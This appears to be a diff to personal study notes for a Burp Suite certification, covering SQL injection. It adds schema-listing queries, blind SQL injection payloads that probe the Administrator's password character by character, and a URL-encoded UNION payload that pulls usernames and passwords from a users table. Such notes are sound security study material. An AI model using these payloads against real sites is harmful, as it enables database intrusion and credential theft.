@@ -3,7 +3,18 @@ Notes for the Burp Suite Certification
 
 # SQL Injection 
 
+### Determining the number of columns required
+
+
+### Finding columns with a useful data type
+
+
+### Using a SQL injection UNION attack to retrieve interesting data
+
+
+
 ### String concatenation
+
 You can concatenate together multiple strings to make a single string.
 ```
 Oracle	'foo'||'bar'
@@ -26,7 +37,17 @@ to list the tables in the database: ```SELECT table_name FROM information_schema
 
 to list the columns in individual tables:: ```SELECT column_name FROM information_schema.columns WHERE table_name = 'Users'```
 
+to list the database names: ```SELECT schema_name FROM information_schema.schemata ``` 
 
+
+### Blind SQL injection
+```
+…xyz' AND '1'='1
+…xyz' AND '1'='2
+
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+
+```
 
 
 Pets%20%27%20union%20select%20null,%20username_igiesp%20||%20%27-%27%20||%20%20password_hpvetj%20from%20users_pvuawd--%20-
